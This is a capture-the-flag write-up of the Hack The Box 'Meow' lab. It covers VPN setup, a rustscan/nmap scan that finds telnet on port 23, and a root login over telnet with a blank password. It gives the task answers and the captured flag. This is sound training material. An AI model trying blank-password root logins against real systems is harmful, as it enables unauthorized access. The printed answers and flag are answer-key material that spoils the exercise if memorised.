- - - 
created : 30-07-2025 

Tags : #veryeasy
- - - 
# Objective

Learn how to start.
# CONNECT

To attack the target machine, you must be on the same network.  
Connect to the Starting Point VPN using one of the following options.

It may take a minute for HTB to recognize your connection.  
If you don't see an update after 2-3 minutes, refresh the page.

I will use OpenVPN, so i download the config file, go in the same directory and execute the following command :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB]
└─$ sudo openvpn starting_point_mdn0x.ovpn 
[sudo] password di mdn0x: 
```

Now we can start our [Vulnerable Machine](../../../../3%20-%20Tags/Hacking%20Concepts/Vulnerable%20Machine.md).
# Task 1

What does the acronym VM stand for?

```bash
 Virtual Machine
```
# Task 2

What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or [Shell](../../../../3%20-%20Tags/Hacking%20Concepts/Shell.md).

```bash
 Terminal
```
# Task 3

What service do we use to form our VPN connection into HTB labs?

```bash
 Openvpn
```
# Task 4

What tool do we use to test our connection to the target with an ICMP echo request?

```bash
 Ping
```
# Task 5

What is the name of the most common tool for finding open ports on a target?

```bash
 Nmap
```
# Task 6

What service do we identify on port 23/tcp during our scans?
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, so we don't have to remember the [IP address](../../../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) every time :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Meow]
└─$ sudo nano /etc/hosts
```

We add a line with the given IP and a name :

![Pasted image 20250730175807.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250730175807.png)

then we use [Rustscan](../../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Meow]
└─$ rustscan -a meow.htb -- -A  

Open 10.129.19.5:23

PORT   STATE SERVICE REASON         VERSION
23/tcp open  telnet  syn-ack ttl 63 Linux telnetd

```

So the answer is : 

```bash
 telnet
```
# Task 7

What username is able to log into the target over telnet with a blank password?

```bash
 root
```

# Submit Flag

Submit root flag.

## Telnet Access

We can access on telnet protocol as root without password and retrieve the [Flag](../../../../3%20-%20Tags/Hacking%20Concepts/Flag.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ telnet meow.htb 23 -l root

root@Meow:~# cat flag.txt
 b40abdfe23665f766f9c61ecba8a4c19
```
